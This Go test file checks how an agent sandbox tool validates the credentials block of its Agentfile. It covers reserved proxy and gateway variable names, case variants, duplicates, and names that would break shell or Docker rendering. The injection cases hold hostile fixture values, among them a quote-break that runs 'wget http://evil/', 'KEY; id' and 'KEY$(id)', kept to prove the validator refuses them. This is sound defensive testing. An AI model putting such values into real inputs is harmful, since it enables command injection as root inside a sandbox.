package manifest

import (
	"strings"
	"testing"
)

// credentialAgentfile is a minimal valid Agentfile carrying the given
// credentials block, so each case below goes through Parse and Validate the
// way a real file does.
func credentialAgentfile(block string) []byte {
	return []byte(`apiVersion: constle.dev/v1alpha1
kind: AgentManifest
identity:
  name: cred-agent
credentials:
` + block)
}

// TestCredentialsRejectReservedNames is the guard on the finding that made the
// merge order matter: once the forwarded names come from the Agentfile, a
// manifest can claim a name the runtime builds for the run itself.
//
// CONSTLE_A2A_URL is the sharp one. It is the agent's only route to its A2A
// gate and it carries that run's gate token, so a manifest that could supply
// it would decide, from inside the Agentfile, where its own signed traffic
// goes. HTTP_PROXY is the same shape applied to egress.
//
// Case variants are refused too, and not out of caution: constle is built for
// Windows as well as unix, and Windows environment variables are
// case-insensitive. A case-sensitive rule would make whether an Agentfile can
// overwrite its sandbox's proxy address a property of the host OS.
func TestCredentialsRejectReservedNames(t *testing.T) {
	for _, name := range []string{
		"CONSTLE_A2A_URL",
		"CONSTLE_MCP_EMAIL_URL",
		"CONSTLE_GUEST_CIDR",
		"CONSTLE_GATEWAY_IP",
		"CONSTLE_",
		"constle_a2a_url",
		"Constle_A2A_Url",
		"HTTP_PROXY",
		"http_proxy",
		"HTTPS_PROXY",
		"https_proxy",
		"NO_PROXY",
		"no_proxy",
		"ALL_PROXY",
		"all_proxy",
	} {
		t.Run(name, func(t *testing.T) {
			m, err := Parse(credentialAgentfile("  - name: " + name + "\n"))
			if err != nil {
				t.Fatalf("Parse: %v", err)
			}
			err = m.Validate()
			if err == nil {
				t.Fatalf("Validate accepted %q as a credential name — the agent could point its own sandbox elsewhere", name)
			}
			if !strings.Contains(err.Error(), "reserved") {
				t.Errorf("error does not say the name is reserved, so an author cannot act on it: %v", err)
			}
			if !strings.Contains(err.Error(), name) {
				t.Errorf("error does not name %q: %v", name, err)
			}
		})
	}
}

// TestCredentialsAcceptNamesThatMerelyResembleReservedOnes pins the other side:
// the rule is a prefix and an exact set, not a substring search. A credential
// that happens to contain "PROXY" or ends in "_CONSTLE_TOKEN" is an ordinary
// third-party variable, and refusing it would be refusing legitimate files.
func TestCredentialsAcceptNamesThatMerelyResembleReservedOnes(t *testing.T) {
	for _, name := range []string{
		"PROXY_API_KEY",
		"MY_CONSTLE_TOKEN",
		"NO_PROXY_TOKEN",
		"HTTP_PROXY_PASSWORD",
		"CONSTELLATION_KEY",
	} {
		t.Run(name, func(t *testing.T) {
			m, err := Parse(credentialAgentfile("  - name: " + name + "\n"))
			if err != nil {
				t.Fatalf("Parse: %v", err)
			}
			if err := m.Validate(); err != nil {
				t.Errorf("Validate refused %q, which constle does not build: %v", name, err)
			}
		})
	}
}

// TestCredentialsRejectUnrenderableNames is the guard on the second finding: a
// credential name is rendered into two formats that cannot escape it.
//
// The Firecracker backend writes `export NAME='value'` into a file the guest
// sources as root — the value is quoted, the name cannot be, so a quote or a
// newline in the name closes the statement and starts another one. The Docker
// backend passes `-e NAME` with no "=", precisely so the value stays out of a
// world-readable argv; a name containing "=" turns that back into an inline
// assignment.
//
// Same judgement as sandbox.network.allowed_hosts, which is refused rather
// than escaped because squid.conf has no quoting either.
func TestCredentialsRejectUnrenderableNames(t *testing.T) {
	tests := []struct {
		name  string
		yaml  string
		about string
	}{
		{"single quote", `  - name: "KEY'; wget http://evil/ #"` + "\n", "closes the export statement in the guest env file"},
		{"newline", `  - name: "KEY\nexport EVIL=1"` + "\n", "starts a second export line"},
		{"semicolon", `  - name: "KEY; id"` + "\n", "ends the statement"},
		{"equals", `  - name: "KEY=inline-value"` + "\n", "restores an inline -e NAME=VALUE in the docker argv"},
		{"space", `  - name: "KEY OTHER"` + "\n", "splits into two shell words"},
		{"dollar", `  - name: "KEY$(id)"` + "\n", "is a command substitution"},
		{"leading digit", "  - name: 1KEY\n", "is not a portable variable name"},
		{"empty", `  - name: ""` + "\n", "names nothing"},
		{"dash", "  - name: KEY-NAME\n", "is not a portable variable name"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			m, err := Parse(credentialAgentfile(tc.yaml))
			if err != nil {
				// A parse error is an acceptable refusal too — it is still a
				// refusal — but the message must be about the name.
				if !strings.Contains(err.Error(), "credential") && !strings.Contains(err.Error(), "name") {
					t.Fatalf("Parse failed for an unrelated reason: %v", err)
				}
				return
			}
			if err := m.Validate(); err == nil {
				t.Fatalf("Validate accepted a name that %s", tc.about)
			}
		})
	}
}

// TestCredentialsSecretRefIsCheckedButNotReserved pins the deliberate asymmetry.
//
// secret_ref names a variable in the OPERATOR's environment, so the reserved
// list does not apply to it: forwarding the operator's own HTTP_PROXY into a
// sandbox under some other name is their business, and refusing it would reject
// legitimate host layouts. The name grammar still applies, because the value is
// looked up by that name.
func TestCredentialsSecretRefIsCheckedButNotReserved(t *testing.T) {
	m, err := Parse(credentialAgentfile("  - name: UPSTREAM_PROXY\n    secret_ref: HTTP_PROXY\n"))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if err := m.Validate(); err != nil {
		t.Errorf("Validate refused a reserved name used as secret_ref, which names the operator's own variable: %v", err)
	}

	m, err = Parse(credentialAgentfile("  - name: OK_NAME\n    secret_ref: \"BAD NAME\"\n"))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if err := m.Validate(); err == nil {
		t.Error("Validate accepted a secret_ref that is not a legal environment variable name; the lookup could never find it")
	}
}

// TestCredentialsRejectDuplicateNames: two entries for one in-sandbox variable
// have no answer to "which value does the agent get" other than iteration
// order, which is not something an Agentfile should decide by accident.
func TestCredentialsRejectDuplicateNames(t *testing.T) {
	m, err := Parse(credentialAgentfile(
		"  - name: API_KEY\n    secret_ref: KEY_A\n  - name: API_KEY\n    secret_ref: KEY_B\n"))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	err = m.Validate()
	if err == nil {
		t.Fatal("Validate accepted two credentials claiming the same name")
	}
	if !strings.Contains(err.Error(), "credentials[0]") {
		t.Errorf("error does not point at the earlier entry, so the pair is not findable: %v", err)
	}
}

// TestCredentialsRejectCaseVariantDuplicates is the same rule as the exact
// duplicate above, and it is here because the first version of this check missed
// it — found by adversarial review of the fix, in the same bug class as the check
// itself.
//
// ReservedCredentialName is case-insensitive because Windows environment
// variables are, which makes `HTTP_PROXY` and `http_proxy` one variable there.
// That reasoning applies verbatim to the other check that asks whether two
// entries name the same variable: `FOO` beside `foo` validated, and on Windows
// which of the two values the agent received came down to the environment layer
// rather than to the Agentfile.
func TestCredentialsRejectCaseVariantDuplicates(t *testing.T) {
	m, err := Parse(credentialAgentfile(
		"  - name: API_KEY\n    secret_ref: KEY_A\n  - name: api_key\n    secret_ref: KEY_B\n"))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	err = m.Validate()
	if err == nil {
		t.Fatal("Validate accepted two credentials whose names differ only in case")
	}
	// The message has to name BOTH spellings: told only that "api_key is already
	// declared", an author looks for an api_key that is not in the file.
	for _, want := range []string{"API_KEY", "api_key", "case"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error is missing %q, so the pair is not findable from it: %v", want, err)
		}
	}
}

// TestCredentialSourceDefaultsToName: every caller resolves through Source, and
// an empty secret_ref means "the same name on the host". A caller that read the
// field directly would look up "" and find nothing — a declared credential
// silently absent from the sandbox.
func TestCredentialSourceDefaultsToName(t *testing.T) {
	if got := (Credential{Name: "GROQ_API_KEY"}).Source(); got != "GROQ_API_KEY" {
		t.Errorf("Source() = %q, want the name itself", got)
	}
	if got := (Credential{Name: "GROQ_API_KEY", SecretRef: "GROQ_PROD"}).Source(); got != "GROQ_PROD" {
		t.Errorf("Source() = %q, want the secret_ref", got)
	}
}

// TestCredentialNamesPreservesDeclarationOrder: the order is load-bearing.
// CredentialNames feeds the run_started audit entry, and a JSON array's order
// is part of the signed bytes — derived from a map it would differ between two
// runs of one Agentfile.
func TestCredentialNamesPreservesDeclarationOrder(t *testing.T) {
	m, err := Parse(credentialAgentfile("  - name: ZULU\n  - name: ALPHA\n  - name: MIKE\n"))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	want := []string{"ZULU", "ALPHA", "MIKE"}
	got := m.CredentialNames()
	if len(got) != len(want) {
		t.Fatalf("CredentialNames() = %v, want %v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("CredentialNames()[%d] = %q, want %q — not declaration order", i, got[i], want[i])
		}
	}
}

// TestCredentialsTypoIsReportedWithTheSection is the payoff for shaping the
// section as a list of objects rather than a list of strings: the strict
// decoder's reflection walk reaches credentials[] on its own, so a misspelled
// key is answered with the accepted keys and the nearest match. A flat list of
// strings could not be typo'd this way, but it could not be told apart from a
// value either.
func TestCredentialsTypoIsReportedWithTheSection(t *testing.T) {
	_, err := Parse(credentialAgentfile("  - nmae: GROQ_API_KEY\n"))
	if err == nil {
		t.Fatal("Parse accepted a misspelled key inside credentials[]")
	}
	for _, want := range []string{"credentials[]", "did you mean \"name\"?", "accepted here: name, secret_ref"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("message is missing %q, so the author is not told what to write:\n%v", want, err)
		}
	}
}

// TestNoCredentialsIsValid: the section is optional, so an Agentfile written
// before it existed still parses and validates.
//
// That is ALL this proves, and it passes against a build with no credentials
// feature at all — deliberately, because "the breaking change does not break
// validation" is the claim being made here. The half that matters, that such a
// manifest now receives nothing, cannot be asserted from this package: it is
// agentenv.TestResolveForwardsNothingWhenNothingIsDeclared, which exports all
// three of the variables the runtime used to forward and requires that none
// arrive.
func TestNoCredentialsIsValid(t *testing.T) {
	m, err := Parse([]byte(`apiVersion: constle.dev/v1alpha1
kind: AgentManifest
identity:
  name: no-creds
`))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if err := m.Validate(); err != nil {
		t.Fatalf("Validate refused a manifest with no credentials section: %v", err)
	}
	if len(m.CredentialNames()) != 0 {
		t.Errorf("CredentialNames() = %v, want empty", m.CredentialNames())
	}
}
